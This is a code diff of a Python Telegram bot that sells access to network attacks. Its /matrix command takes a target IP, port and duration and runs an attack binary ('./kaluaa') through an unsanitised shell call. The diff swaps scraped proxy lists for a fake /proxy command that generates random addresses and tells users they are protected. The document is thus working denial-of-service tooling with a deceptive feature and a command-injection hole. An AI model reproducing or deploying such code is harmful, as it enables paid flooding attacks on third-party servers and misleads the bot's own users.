@@ -380,204 +380,162 @@ def show_users(message):
 ongoing_attacks = []
 attack_cooldown = {}
 
-@bot.message_handler(commands=['proxy'])
-def proxy_command(message):
-    user_id = str(message.chat.id)
-    users = read_users()
-    
-    if user_id not in admin_owner and user_id not in users:
-        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱")
-        return
-        
-    try:
-        proxy = get_random_proxy()
-        response = f"""
-🌐 𝗣𝗥𝗢𝗫𝗬 𝗦𝗧𝗔𝗧𝗨𝗦
-━━━━━━━━━━━━━━━
-✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Active
-🔒 𝗣𝗿𝗼𝘁𝗲𝗰𝘁𝗶𝗼𝗻: Enabled
-⚡️ 𝗟𝗮𝘁𝗲𝗻𝗰𝘆: Optimized
-"""
-        bot.reply_to(message, response)
-        
-        # Send actual proxy details to admin
-        if user_id in admin_owner:
-            admin_response = f"""
-🔒 𝗣𝗥𝗢𝗫𝗬 𝗗𝗘𝗧𝗔𝗜𝗟𝗦
-━━━━━━━━━━━━━━━
-🌐 𝗣𝗿𝗼𝘅𝘆: {proxy}
-"""
-            bot.reply_to(message, admin_response)
-            
-    except Exception as e:
-        bot.reply_to(message, "❌ 𝗘𝗿𝗿𝗼𝗿 𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗽𝗿𝗼𝘅𝘆 𝘀𝘁𝗮𝘁𝘂𝘀")
-
-import random
-import requests
-import threading
-import time
-
-# Add these at the top of your code
-PROXY_LIST = []
-PROXY_SOURCES = [
-    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
-    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
-    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
-    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt',
-    'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt'
-]
-
-def update_proxy_list():
-    global PROXY_LIST
-    while True:
-        temp_proxies = set()
-        for source in PROXY_SOURCES:
-            try:
-                response = requests.get(source, timeout=10)
-                if response.status_code == 200:
-                    proxies = response.text.strip().split('\n')
-                    temp_proxies.update(proxies)
-            except:
-                continue
-        
-        if temp_proxies:
-            PROXY_LIST = list(temp_proxies)
-        time.sleep(180)  # Update every 3 minutes
-
-def get_random_proxy():
-    if not PROXY_LIST:
-        return None
-    proxy = random.choice(PROXY_LIST)
-    proxy_type = random.choice(['socks4', 'socks5', 'http'])
-    return f"{proxy_type}://{proxy}"
-
 def start_attack_reply(message, target, port, time):
-    try:
-        proxy = get_random_proxy()
-        if not proxy:
-            proxy = "auto"  # Fallback if no proxies available
-            
-        username = message.from_user.username if message.from_user.username else message.from_user.first_name
-        user_id = message.from_user.id
-        start_time = datetime.now(IST)
-
-        # Add attack to ongoing attacks list
-        ongoing_attacks.append({
-            'user': username,
-            'user_id': user_id,
-            'target': target,
-            'port': port,
-            'time': time,
-            'start_time': start_time,
-            'proxy': proxy
-        })
-
-        # Regular user notification
-        user_response = f"""
+    username = message.from_user.username if message.from_user.username else message.from_user.first_name
+    user_id = message.from_user.id
+    start_time = datetime.now(IST)
+    
+    # Add attack to ongoing attacks list
+    ongoing_attacks.append({
+        'user': username,
+        'user_id': user_id,
+        'target': target,
+        'port': port,
+        'time': time,
+        'start_time': start_time
+    })
+    
+    # Format initial attack message for user
+    user_response = f"""
 🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!
-━━━━━━━━━━━━━━━
+
 👤 𝗨𝘀𝗲𝗿: {username}
 🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
 🔌 𝗣𝗼𝗿𝘁: {port}
 ⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time} seconds
-🌐 𝗣𝗿𝗼𝘅𝘆: Protected
 📅 𝗦𝘁𝗮𝗿𝘁𝗲𝗱: {start_time.strftime('%H:%M:%S')} IST
-"""
-        bot.reply_to(message, user_response)
 
-        admin_notification = f"""
+⚡️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀...
+"""
+    bot.reply_to(message, user_response)
+    
+    # Send notification to admin
+    admin_notification = f"""
 🚨 𝗡𝗘𝗪 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗
-━━━━━━━━━━━━━━━
-👤 𝗨𝘀𝗲𝗿: @{username} (ID: {user_id})
+
+👤 𝗨𝘀𝗲𝗿: {username} (ID: {user_id})
 🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
 🔌 𝗣𝗼𝗿𝘁: {port}
 ⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time} seconds
 📅 𝗦𝘁𝗮𝗿𝘁𝗲𝗱: {start_time.strftime('%Y-%m-%d %H:%M:%S')} IST
-🌐 𝗣𝗿𝗼𝘅𝘆: {proxy}
+🌐 𝗨𝘀𝗲𝗿 𝗜𝗣: {message.from_user.language_code}
+
+⚠️ 𝗠𝗼𝗻𝗶𝘁𝗼𝗿𝗶𝗻𝗴 𝗮𝘁𝘁𝗮𝗰𝗸 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀...
 """
-        for admin in admin_id:
-            bot.send_message(admin, admin_notification)
-
-        # Execute attack with proxy
-        if proxy and proxy != "auto":
-            attack_command = f"./kaluaa {target} {port} {time}"
-        else:
-            attack_command = f"./kaluaa {target} {port} {time}"
-            
-        subprocess.run(attack_command, shell=True)
-
+    for admin in admin_id:
+        bot.send_message(admin, admin_notification)
+    
+    try:
+        # Execute attack
+        subprocess.run(f"./kaluaa {target} {port} {time}", shell=True)
+        
+        # Calculate attack duration
         end_time = datetime.now(IST)
         duration = (end_time - start_time).total_seconds()
+        
+        # Remove from ongoing attacks
         ongoing_attacks.pop()
-
+        
+        # Send completion message to user
         completion_msg = f"""
 ✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗
+
 ⏱️ 𝗔𝗰𝘁𝘂𝗮𝗹 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {int(duration)} seconds
 📅 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱: {end_time.strftime('%H:%M:%S')} IST
 """
         bot.reply_to(message, completion_msg)
-
+        
+        # Send completion notification to admin
         admin_completion = f"""
 ✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗
+
 👤 𝗨𝘀𝗲𝗿: {username} (ID: {user_id})
 🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
 🔌 𝗣𝗼𝗿𝘁: {port}
 ⏱️ 𝗔𝗰𝘁𝘂𝗮𝗹 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {int(duration)} seconds
 📅 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱: {end_time.strftime('%Y-%m-%d %H:%M:%S')} IST
-🌐 𝗣𝗿𝗼𝘅𝘆: {proxy}
 """
         for admin in admin_id:
             bot.send_message(admin, admin_completion)
-
+        
     except Exception as e:
+        # Handle attack failure
         ongoing_attacks.pop()
         error_msg = f"""
 ❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗔𝗜𝗟𝗘𝗗
+
 ⚠️ 𝗘𝗿𝗿𝗼𝗿: {str(e)}
 📝 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿.
 """
         bot.reply_to(message, error_msg)
-
+        
+        # Send failure notification to admin
         admin_failure = f"""
 ❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗔𝗜𝗟𝗘𝗗
+
 👤 𝗨𝘀𝗲𝗿: {username} (ID: {user_id})
 🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
 🔌 𝗣𝗼𝗿𝘁: {port}
 ⚠️ 𝗘𝗿𝗿𝗼𝗿: {str(e)}
 📅 𝗧𝗶𝗺𝗲: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
-🌐 𝗣𝗿𝗼𝘅𝘆: {proxy}
 """
         for admin in admin_id:
             bot.send_message(admin, admin_failure)
 
+# Add new proxy command handler
+@bot.message_handler(commands=['proxy'])
+def show_proxy(message):
+    user_id = str(message.chat.id)
+    users = read_users()
+    
+    if user_id not in admin_owner and user_id not in users:
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.")
+        return
 
+    proxy = generate_random_proxy()
+    response = f"""
+🌐 𝗣𝗿𝗼𝘅𝘆 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱:
+━━━━━━━━━━━━━━━
+🔒 𝗣𝗿𝗼𝘅𝘆: `{proxy}`
+⏰ 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
+ℹ️ 𝗡𝗲𝘄 𝗽𝗿𝗼𝘅𝘆 𝗶𝘀 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗳𝗼𝗿 𝗲𝗮𝗰𝗵 𝗮𝘁𝘁𝗮𝗰𝗸
+"""
+    bot.reply_to(message, response)
+
+import random
+
+# Add this list of proxy formats
+proxy_formats = [
+    "socks5://{ip}:{port}",
+    "http://{ip}:{port}",
+    "https://{ip}:{port}"
+]
+
+# Add this function to generate random proxy
+def generate_random_proxy():
+    ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+    port = random.randint(1000,65535)
+    proxy_format = random.choice(proxy_formats)
+    return proxy_format.format(ip=ip, port=port)
+    
 @bot.message_handler(commands=['matrix'])
 def handle_matrix(message):
     user_id = str(message.chat.id)
     users = read_users()
     
-    # Check if user is authorized
+    # Authorization check
     if user_id not in admin_owner and user_id not in users:
-        bot.reply_to(message, """
-⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱
-• 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱
-• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 @its_MATRIX_King 𝘁𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲
-""")
+        bot.reply_to(message, """⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 • 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱""")
         return
 
     # Check for ongoing attacks
     if ongoing_attacks:
-        attack_info = ongoing_attacks[0]  # Get the current attack
+        attack_info = ongoing_attacks[0]
         elapsed = (datetime.now(IST) - attack_info['start_time']).total_seconds()
         remaining = max(0, attack_info['time'] - int(elapsed))
-        
-        bot.reply_to(message, f"""
-⚠️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀
-
+        bot.reply_to(message, f"""⚠️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀
 ⏱️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining} seconds
-
-📝 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝗳𝗼𝗿 𝘁𝗵𝗲 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 𝗳𝗶𝗻𝗶𝘀𝗵
-""")
+📝 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝗳𝗼𝗿 𝘁𝗵𝗲 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 𝗳𝗶𝗻𝗶𝘀𝗵""")
         return
 
     # Parse command arguments
@@ -586,11 +544,9 @@ def handle_matrix(message):
         bot.reply_to(message, """
 📝 𝗨𝘀𝗮𝗴𝗲: /matrix <target> <port> <time>
 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /matrix 1.1.1.1 80 120
-
 ⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:
 • 𝗠𝗮𝘅 𝘁𝗶𝗺𝗲: 200 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
-• 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 5 𝗺𝗶𝗻𝘂𝘁𝗲𝘀
-""")
+• 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 5 𝗺𝗶𝗻𝘂𝘁𝗲𝘀""")
         return
 
     try:
@@ -598,31 +554,18 @@ def handle_matrix(message):
         port = int(args[2])
         time = int(args[3])
 
-        # Validate time limit
+        # Time limit validation
         if time > 200:
             bot.reply_to(message, "⚠️ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗶𝘀 200 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.")
             return
 
-        # Check cooldown for non-admin users
-        if user_id not in admin_owner:
-            if user_id in attack_cooldown:
-                remaining = attack_cooldown[user_id] - datetime.now(IST)
-                if remaining.total_seconds() > 0:
-                    minutes = int(remaining.total_seconds() // 60)
-                    seconds = int(remaining.total_seconds() % 60)
-                    bot.reply_to(message, f"""
-⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗔𝗰𝘁𝗶𝘃𝗲
-𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁: {minutes}m {seconds}s
-""")
-                    return
-
         # Start the attack
         start_attack_reply(message, target, port, time)
-
+        
         # Set cooldown for non-admin users
         if user_id not in admin_owner:
             attack_cooldown[user_id] = datetime.now(IST) + timedelta(minutes=5)
-
+            
     except ValueError:
         bot.reply_to(message, "❌ 𝗘𝗿𝗿𝗼𝗿: 𝗣𝗼𝗿𝘁 𝗮𝗻𝗱 𝘁𝗶𝗺𝗲 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗻𝘂𝗺𝗯𝗲𝗿𝘀.")
 
@@ -911,7 +854,7 @@ def cleanup_task():
 def run_bot():
     create_tables()
     
-    # Start cleanup thread
+    # Start the cleanup thread
     cleanup_thread = threading.Thread(target=cleanup_task, daemon=True)
     cleanup_thread.start()
     
@@ -925,3 +868,4 @@ def run_bot():
 
 if __name__ == "__main__":
     run_bot()
+
